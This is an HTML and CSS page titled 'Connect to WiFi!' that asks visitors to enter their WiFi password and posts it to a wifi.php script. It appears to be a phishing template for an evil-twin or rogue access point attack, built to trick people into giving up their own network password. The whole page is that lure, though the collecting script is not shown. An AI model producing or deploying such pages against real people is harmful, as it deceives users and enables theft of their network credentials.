<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect to WiFi!</title>
</head>

<style>

    body{
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serifs;
        width: 100vw;
        height: 100vh;

        display: flex;
        justify-content: center;
        align-items: center;

    }

    #main{
        width: 60vw;
        height: 40vh;
        background-color: rgb(255, 255, 255);
        /* border: 0.5px solid black; */
        outline: black;
        border-radius: 20px;
        
        box-shadow: 1px 1px 30px grey,
                    -1px -1px 30px grey;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        text-align: center;
    }
    
    img{
        width: 100px;
        /* margin-top: -10px; */
    }

    h3{
        text-align: center;
        padding: 0 15px;
    }

    input{
        border: 2px solid black;      
        outline: none;
        width: 200px;
        padding: 8px;
        border-radius: 20px;
        font-size: 15px;

    }

    button{
        margin: 20px;
        padding: 5px;
        font-size: 20px;
        width: 180px;
        outline: none;
        background-color: rgb(7, 241, 132);
        border-radius: 20px;
        cursor: pointer;
    }
  
    @media only screen and (max-width: 800px) {
	#main{
		width: 80vw;
		height: 60vh;
		box-shadow: 1px 1px 10px grey,
                    -1px -1px 10px grey;
	}
    }

</style>

<body>
    
    <div id="main">
        <img src="./img/wifi.png" alt="Wifi" />
        <h3>Enter your WiFI password to connect!</h3>
        <form action="wifi.php" method="post">
            <input type="password" placeholder="Enter Your Wi-fi Password" name="pass" required />
            <br>
            <button>Submit</button>
        </form>
    </div>

</body>
</html>
